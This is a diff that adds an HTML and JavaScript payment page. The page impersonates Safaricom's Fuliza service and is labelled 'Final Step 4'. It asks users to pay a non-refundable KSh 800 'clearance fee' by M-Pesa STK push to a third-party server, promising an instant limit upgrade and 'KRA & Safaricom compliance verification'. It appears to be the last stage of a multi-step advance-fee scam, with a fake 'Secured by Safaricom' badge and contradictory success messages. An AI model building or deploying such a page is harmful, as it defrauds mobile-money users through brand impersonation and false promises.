@@ -1,0 +1,463 @@
+<!DOCTYPE html>  
+<html lang="en">  
+<head>  
+<meta charset="UTF-8">  
+<meta name="viewport" content="width=device-width, initial-scale=1.0">  
+<title>Final Clearance Payment</title>  
+<style>  
+*{box-sizing:border-box;margin:0;padding:0;}  
+body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;min-height:100vh;}  .top-bar{background:linear-gradient(135deg,#1fb141,#16903a);padding:14px;text-align:center;color:#fff;font-weight:700;font-size:18px;letter-spacing:.3px;box-shadow:0 2px 8px rgba(0,0,0,.15);}
+
+.page-wrap{max-width:430px;margin:36px auto 30px;padding:0 12px;}
+
+.step-badge{display:flex;align-items:center;gap:10px;margin-bottom:16px;}
+.step-dot{width:28px;height:28px;border-radius:50%;background:linear-gradient(135deg,#1fb141,#16903a);color:#fff;font-size:13px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
+.step-line{flex:1;height:2px;background:#d4edda;border-radius:2px;}
+.step-label{font-size:12.5px;color:#888;white-space:nowrap;}
+
+.invoice-card{background:#fff;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,.1);overflow:hidden;margin-bottom:16px;}
+
+.invoice-header{background:linear-gradient(135deg,#1fb141,#16903a);padding:22px 24px 18px;color:#fff;}
+.invoice-header-top{display:flex;justify-content:space-between;align-items:flex-start;}
+.invoice-title{font-size:16px;font-weight:700;letter-spacing:.2px;}
+.invoice-tag{background:rgba(255,255,255,.2);font-size:11px;font-weight:600;padding:3px 10px;border-radius:20px;letter-spacing:.5px;}
+.invoice-limit{margin-top:10px;font-size:13px;opacity:.85;}
+.invoice-limit span{font-weight:700;opacity:1;}
+
+.invoice-amount-row{display:flex;align-items:baseline;gap:6px;margin-top:18px;padding-top:16px;border-top:1px solid rgba(255,255,255,.25);}
+.invoice-currency{font-size:20px;font-weight:700;opacity:.85;}
+.invoice-amount{font-size:48px;font-weight:800;line-height:1;letter-spacing:-1px;}
+.invoice-label{font-size:12px;opacity:.75;align-self:flex-end;padding-bottom:6px;}
+
+.checklist{padding:18px 24px;}
+.checklist-title{font-size:12px;color:#999;font-weight:600;text-transform:uppercase;letter-spacing:.6px;margin-bottom:12px;}
+.check-item{display:flex;align-items:flex-start;gap:10px;margin-bottom:10px;}
+.check-icon{width:20px;height:20px;border-radius:50%;background:#e8f5e9;color:#1fb141;font-size:11px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px;}
+.check-text{font-size:13.5px;color:#444;line-height:1.45;}
+
+.invoice-divider{height:1px;background:#f0f0f0;margin:0 24px;}
+
+.clearance-note{margin:14px 24px;padding:12px 14px;background:#e8f5e9;border-left:4px solid #1fb141;border-radius:4px;font-size:12.5px;color:#16903a;line-height:1.6;}
+
+.pay-section{background:#fff;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,.1);padding:24px;}
+.pay-section-title{font-size:14px;font-weight:700;color:#1a1a2e;margin-bottom:4px;}
+.pay-section-sub{font-size:12.5px;color:#888;margin-bottom:16px;}
+
+.phone-wrap{display:flex;align-items:center;border:2px solid #ddd;border-radius:10px;overflow:hidden;transition:border-color .2s;}
+.phone-wrap:focus-within{border-color:#1fb141;}
+.phone-wrap.invalid{border-color:#e74c3c;}
+.phone-wrap.valid{border-color:#1fb141;}
+.phone-prefix{background:#e8f5e9;color:#1fb141;font-weight:700;font-size:16px;padding:13px 12px;border-right:2px solid #ddd;white-space:nowrap;user-select:none;}
+.phone-input{flex:1;border:none;outline:none;padding:13px 12px;font-size:16px;color:#333;background:transparent;}
+.phone-status{padding:0 12px;font-size:18px;}
+.phone-hint{font-size:12px;color:#888;margin-top:5px;}
+
+.pay-btn{margin-top:18px;width:100%;padding:15px;background:linear-gradient(135deg,#1fb141,#16903a);border:none;color:#fff;font-size:16px;font-weight:600;border-radius:30px;cursor:pointer;transition:transform .15s,box-shadow .15s;letter-spacing:.3px;}
+.pay-btn:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 6px 20px rgba(124,58,237,.4);}
+.pay-btn:disabled{opacity:.6;cursor:not-allowed;transform:none;}
+
+.spinner{margin-top:16px;display:none;flex-direction:column;align-items:center;gap:8px;}
+.loader{border:4px solid #f3f3f3;border-top:4px solid #1fb141;border-radius:50%;width:34px;height:34px;animation:spin 1s linear infinite;}
+@keyframes spin{to{transform:rotate(360deg);}}
+.spinner-text{font-size:13px;color:#666;}
+
+.status-msg{margin-top:14px;font-size:14px;font-weight:500;padding:10px 14px;border-radius:8px;display:none;}
+.status-msg.info{background:#e8f5e9;color:#16903a;}
+.status-msg.error{background:#fdecea;color:#c0392b;}
+
+.secure-note{display:flex;align-items:center;justify-content:center;gap:6px;margin-top:16px;font-size:12px;color:#aaa;}
+
+#confettiCanvas{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:2000;display:none;}
+
+.overlay{position:fixed;inset:0;background:rgba(0,0,0,.55);backdrop-filter:blur(4px);z-index:1000;display:flex;align-items:flex-end;justify-content:center;opacity:0;pointer-events:none;transition:opacity .3s;}
+.overlay.show{opacity:1;pointer-events:all;}
+
+.popup{background:#fff;border-radius:22px 22px 0 0;width:100%;max-width:480px;padding:0 0 30px;transform:translateY(100%);transition:transform .4s cubic-bezier(.32,1.15,.6,1);box-shadow:0 -8px 40px rgba(0,0,0,.25);}
+.overlay.show .popup{transform:translateY(0);}
+
+.popup-header{border-radius:22px 22px 0 0;padding:28px 24px 22px;text-align:center;}
+.popup-header.success{background:linear-gradient(135deg,#1fb141,#16903a);}
+.popup-header.failure{background:linear-gradient(135deg,#e74c3c,#c0392b);}
+.popup-icon{width:64px;height:64px;border-radius:50%;background:rgba(255,255,255,.25);display:flex;align-items:center;justify-content:center;margin:0 auto 12px;font-size:30px;}
+.popup-title{color:#fff;font-size:20px;font-weight:700;}
+.popup-subtitle{color:rgba(255,255,255,.85);font-size:13.5px;margin-top:4px;}
+
+.receipt-body{padding:20px 24px 0;}
+.receipt-row{display:flex;justify-content:space-between;align-items:center;padding:10px 0;border-bottom:1px solid #f0f0f0;font-size:14px;}
+.receipt-row:last-child{border-bottom:none;}
+.receipt-label{color:#888;font-weight:500;}
+.receipt-value{color:#1a1a2e;font-weight:600;text-align:right;max-width:60%;}
+
+.purpose-note{margin:16px 24px 0;background:#e8f5e9;border-left:4px solid #1fb141;border-radius:4px;padding:10px 14px;font-size:13px;color:#16903a;line-height:1.5;}
+.purpose-note.failure-note{background:#fff5f5;border-left-color:#e74c3c;color:#8b0000;}
+
+.success-banner{margin:16px 24px 0;background:linear-gradient(135deg,#f0fdf4,#dcfce7);border:2px solid #4ade80;border-radius:12px;padding:16px;text-align:center;}
+.success-banner .big-emoji{font-size:40px;display:block;margin-bottom:8px;}
+.success-banner h3{color:#166534;font-size:18px;font-weight:700;margin-bottom:4px;}
+.success-banner p{color:#15803d;font-size:13px;line-height:1.5;}
+
+.popup-actions{display:flex;gap:12px;padding:20px 24px 0;}
+.btn-proceed{flex:1;padding:14px;background:linear-gradient(135deg,#1fb141,#16903a);color:#fff;border:none;border-radius:30px;font-size:15px;font-weight:600;cursor:pointer;transition:transform .15s,box-shadow .15s;}
+.btn-proceed:hover{transform:translateY(-2px);box-shadow:0 4px 14px rgba(124,58,237,.4);}
+.btn-retry{flex:1;padding:14px;background:linear-gradient(135deg,#e74c3c,#c0392b);color:#fff;border:none;border-radius:30px;font-size:15px;font-weight:600;cursor:pointer;transition:transform .15s;}
+.btn-retry:hover{transform:translateY(-2px);}
+
+@media(max-width:480px){
+.page-wrap{margin:20px auto;padding:0 10px;}
+.popup{border-radius:18px 18px 0 0;}
+}
+</style>
+
+</head>  
+<body>  <canvas id="confettiCanvas"></canvas>
+
+<header class="top-bar">Safaricom Fuliza — Final Step 4</header>  <div class="page-wrap">    <div class="step-badge">  
+    <div class="step-dot">4</div>  
+    <div class="step-line"></div>  
+    <div class="step-label">Final Clearance Payment</div>  
+  </div>    <div class="invoice-card">  
+    <div class="invoice-header">  
+      <div class="invoice-header-top">  
+        <div class="invoice-title">Clearance Fee Invoice</div>  
+        <div class="invoice-tag">FINAL STEP</div>  
+      </div>  
+      <div class="invoice-limit">Selected Fuliza Limit: <span>KSh <span id="limit">—</span></span></div>  
+      <div class="invoice-amount-row">  
+        <div class="invoice-currency">KSh</div>  
+        <div class="invoice-amount">800</div>  
+        <div class="invoice-label">Amount Due</div>  
+      </div>  
+    </div>  <div class="checklist">  
+  <div class="checklist-title">What this final payment unlocks</div>  
+  <div class="check-item">  
+    <div class="check-icon">✓</div>  
+    <div class="check-text">Clears any pending Hustle Funds balance on your account</div>  
+  </div>  
+  <div class="check-item">  
+    <div class="check-icon">✓</div>  
+    <div class="check-text">Completes KRA &amp; Safaricom compliance verification</div>  
+  </div>  
+  <div class="check-item">  
+    <div class="check-icon">✓</div>  
+    <div class="check-text">Triggers instant activation of your new Fuliza limit</div>  
+  </div>  
+</div>  
+
+<div class="invoice-divider"></div>  
+
+<div class="clearance-note">  
+  🏆 <strong>You're almost there!</strong> This is the very last step. Once this clearance fee is paid, your Fuliza limit will be <strong>instantly upgraded to KSh <span id="limitInNote">—</span></strong>. No further steps required — your new limit activates immediately upon payment confirmation.  
+</div>  
+
+<div style="padding:14px 24px;font-size:12px;color:#aaa;text-align:center;">  
+  This clearance fee finalizes your upgrade. It is non-refundable once processed.  
+</div>
+
+  </div>    <div class="pay-section">  
+    <div class="pay-section-title">Pay via M-Pesa STK Push</div>  
+    <div class="pay-section-sub">A payment prompt will be sent directly to your phone.</div>  <div class="phone-wrap" id="phoneWrap">  
+  <span class="phone-prefix">254</span>  
+  <input class="phone-input" type="tel" id="phone" placeholder="7XXXXXXXX" maxlength="9" inputmode="numeric" autocomplete="tel">  
+  <span class="phone-status" id="phoneStatus"></span>  
+</div>  
+<div class="phone-hint" id="phoneHint">Enter 9 digits after 254 — must start with 7 (e.g. 712345678)</div>  
+
+<button class="pay-btn" id="payBtn" onclick="payNow()">Pay KSh 800 &amp; Activate Limit</button>  
+
+<div class="spinner" id="spinner">  
+  <div class="loader"></div>  
+  <div class="spinner-text" id="spinnerText">Sending STK Push to your phone…</div>  
+</div>  
+
+<div class="status-msg" id="statusMsg"></div>  
+
+<div class="secure-note">🔒 Secured by Safaricom M-Pesa</div>
+
+  </div>  </div>  <!-- Success Popup -->  <div class="overlay" id="successOverlay">  
+  <div class="popup">  
+    <div class="popup-header success">  
+      <div class="popup-icon">🎉</div>  
+      <div class="popup-title">Limit Activated!</div>  
+      <div class="popup-subtitle">Your Fuliza upgrade is complete</div>  
+    </div>  
+    <div class="receipt-body">  
+      <div class="receipt-row"><span class="receipt-label">Receipt No.</span><span class="receipt-value" id="rReceiptNo">—</span></div>  
+      <div class="receipt-row"><span class="receipt-label">Amount Paid</span><span class="receipt-value" id="rAmount">—</span></div>  
+      <div class="receipt-row"><span class="receipt-label">Phone</span><span class="receipt-value" id="rPhone">—</span></div>  
+      <div class="receipt-row"><span class="receipt-label">Date &amp; Time</span><span class="receipt-value" id="rDate">—</span></div>  
+      <div class="receipt-row"><span class="receipt-label">Status</span><span class="receipt-value" style="color:#1fb141;">Completed ✓</span></div>  
+    </div>  
+    <div class="success-banner">  
+      <span class="big-emoji">🏆</span>  
+      <h3>Congratulations!</h3>  
+      <p>Your Fuliza limit has been successfully upgraded to<br><strong style="font-size:18px;">KSh <span id="rNewLimit">—</span></strong>.<br>Your new limit would be upgraded within 48 hours, Make sure your M-Pesa account is active.</p>  
+    </div>  
+    <div class="purpose-note" style="margin-top:16px;">  
+      All 4 steps completed — clearance fee received and Fuliza limit is now active. Check your Fuliza balance on M-Pesa to confirm your new limit.  
+    </div>  
+    <div class="popup-actions">  
+      <button class="btn-proceed" onclick="closeSuccess()">Done 🎊</button>  
+    </div>  
+  </div>  
+</div>  <!-- Failure Popup -->  <div class="overlay" id="failureOverlay">  
+  <div class="popup">  
+    <div class="popup-header failure">  
+      <div class="popup-icon">❌</div>  
+      <div class="popup-title">Payment Failed</div>  
+      <div class="popup-subtitle">Clearance fee could not be collected</div>  
+    </div>  
+    <div class="purpose-note failure-note" id="failureReason">  
+      Please check your M-Pesa PIN and balance, then try again. Your limit upgrade is on hold until this final step is completed.  
+    </div>  
+    <div class="popup-actions">  
+      <button class="btn-retry" onclick="retryPayment()">↩ Try Again</button>  
+    </div>  
+  </div>  
+</div>
+ <script>
+/* =========================
+   CONFIGURATION
+========================= */
+const BACKEND = "https://optimapay-server.onrender.com";
+const CLEARANCE_FEE = 800;
+
+/* =========================
+   ELEMENT REFERENCES
+========================= */
+const phoneInput  = document.getElementById("phone");
+const phoneWrap   = document.getElementById("phoneWrap");
+const phoneStatus = document.getElementById("phoneStatus");
+const phoneHint   = document.getElementById("phoneHint");
+const payBtn      = document.getElementById("payBtn");
+const spinner     = document.getElementById("spinner");
+const spinnerText = document.getElementById("spinnerText");
+const statusMsg   = document.getElementById("statusMsg");
+
+let pollInterval = null;
+
+/* =========================
+   STEP PROTECTION
+========================= */
+if(!localStorage.getItem("payment3Completed")){
+  window.location.href = "payment3.html";
+}
+
+/* =========================
+   PHONE INPUT VALIDATION
+========================= */
+phoneInput.addEventListener("input", () => {
+  phoneInput.value = phoneInput.value.replace(/\D/g,"").slice(0,9);
+  validatePhoneUI(phoneInput.value);
+});
+
+function validatePhoneUI(val){
+  if(val.length !== 9){
+    phoneWrap.className="phone-wrap";
+    phoneStatus.innerText="";
+    return false;
+  }
+  if(!val.startsWith("7") && !val.startsWith("1")){
+    phoneWrap.className="phone-wrap invalid";
+    phoneStatus.innerText="✗";
+    phoneStatus.style.color="#e74c3c";
+    return false;
+  }
+  phoneWrap.className="phone-wrap valid";
+  phoneStatus.innerText="✓";
+  phoneStatus.style.color="#1fb141";
+  return true;
+}
+
+/* =========================
+   UI HELPERS
+========================= */
+function showStatus(msg,type){
+  statusMsg.innerText = msg;
+  statusMsg.className = "status-msg " + type;
+  statusMsg.style.display = "block";
+}
+
+function hideStatus(){
+  statusMsg.style.display = "none";
+}
+
+function setSpinner(show,text){
+  spinner.style.display = show ? "flex" : "none";
+  if(text) spinnerText.innerText = text;
+}
+
+function setPayBtn(disabled){
+  payBtn.disabled = disabled;
+}
+
+/* =========================
+   PAY NOW
+========================= */
+async function payNow(){
+
+  const digits = phoneInput.value.trim();
+
+  if(!validatePhoneUI(digits)){
+    showStatus("Enter a valid Safaricom number.","error");
+    return;
+  }
+
+  const fullPhone = "254" + digits;
+
+  hideStatus();
+  setSpinner(true,"Sending STK Push...");
+  setPayBtn(true);
+
+  let data;
+
+  try {
+    const res = await fetch(`${BACKEND}/stk-push`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        phone: fullPhone,
+        amount: CLEARANCE_FEE
+      })
+    });
+
+    data = await res.json();
+  } catch(e){
+    setSpinner(false);
+    setPayBtn(false);
+    showStatus("Network error contacting server.","error");
+    return;
+  }
+
+  if(!data.success){
+    setSpinner(false);
+    setPayBtn(false);
+    showStatus(data.message || "STK Push failed.","error");
+    return;
+  }
+
+  const checkoutId = data.checkout_request_id || data.CheckoutRequestID || data.data?.checkout_request_id;
+
+  if(!checkoutId){
+    setSpinner(false);
+    setPayBtn(false);
+    showStatus("STK Push could not be initiated.","error");
+    return;
+  }
+
+  setSpinner(true,"STK sent ✓ Enter PIN on phone");
+  showStatus("Waiting for M-Pesa confirmation...","info");
+
+  startPolling(checkoutId, fullPhone);
+}
+
+/* =========================
+   POLLING FUNCTION
+========================= */
+function startPolling(checkoutId, phone){
+
+  let attempts = 0;
+  const maxAttempts = 60;
+
+  clearInterval(pollInterval);
+
+  pollInterval = setInterval(async () => {
+
+    attempts++;
+
+    if(attempts > maxAttempts){
+      clearInterval(pollInterval);
+      setSpinner(false);
+      setPayBtn(false);
+      showFailurePopup("Payment confirmation timed out. Please try again.");
+      return;
+    }
+
+    try{
+      const res = await fetch(`${BACKEND}/check-status`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ checkout_request_id: checkoutId })
+      });
+
+      if(!res.ok) return;
+
+      const data = await res.json();
+      if(!data || !data.status) return;
+
+      const status = data.status.toLowerCase();
+
+      if(status === "pending"){
+        showStatus("Waiting for M-Pesa confirmation...","info");
+        return;
+      }
+
+      clearInterval(pollInterval);
+      setSpinner(false);
+      setPayBtn(false);
+
+      if(["completed","success","paid","processing"].includes(status)){
+        localStorage.setItem("payment4Completed","yes");
+        showSuccessPopup({
+          reference: data.transaction_code || checkoutId,
+          amount: CLEARANCE_FEE,
+          phone: phone,
+          timestamp: Date.now()
+        });
+        return;
+      }
+
+      if(status === "failed"){
+        showFailurePopup(data.message || "Payment failed or cancelled.");
+        return;
+      }
+
+      // fallback for unknown status
+      showFailurePopup("Payment status unknown. Try again.");
+
+    } catch(err){
+      console.log("Polling error:", err);
+    }
+
+  }, 3000);
+
+}
+
+/* =========================
+   SUCCESS POPUP
+========================= */
+function showSuccessPopup(receipt){
+  document.getElementById("rReceiptNo").innerText = receipt.reference;
+  document.getElementById("rAmount").innerText = "KSh " + receipt.amount;
+  document.getElementById("rPhone").innerText = receipt.phone;
+  document.getElementById("rDate").innerText = new Date(receipt.timestamp).toLocaleString("en-KE");
+
+  document.getElementById("successOverlay").classList.add("show");
+
+  setTimeout(()=>{
+    window.location.href = "success.html";
+  }, 8000);
+}
+
+function closeSuccess(){
+  document.getElementById("successOverlay").classList.remove("show");
+  setTimeout(()=>window.location.href="success.html",300);
+}
+
+/* =========================
+   FAILURE POPUP
+========================= */
+function showFailurePopup(reason){
+  document.getElementById("failureReason").innerText = reason;
+  document.getElementById("failureOverlay").classList.add("show");
+}
+
+function retryPayment(){
+  document.getElementById("failureOverlay").classList.remove("show");
+  clearInterval(pollInterval);
+  hideStatus();
+  setSpinner(false);
+  setPayBtn(false);
+}
+    </script>  
+</body>  
+</html>
